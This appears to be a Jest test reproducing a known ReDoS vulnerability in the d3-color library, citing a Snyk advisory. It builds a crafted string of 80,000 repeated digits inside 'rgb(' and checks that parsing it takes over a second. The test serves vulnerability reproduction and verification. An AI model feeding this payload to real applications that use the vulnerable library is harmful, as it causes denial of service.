
//https://snyk.io/vuln/SNYK-JS-D3COLOR-1076592
test("ReDos in ms", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const d3Color = require("d3-color")

    let attack_str = "rgb(" + genstr(80000, "1") + "!";//build_blank();
    
    let t = measureTime(function () {
        
        d3Color.rgb(attack_str)

    });
    

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});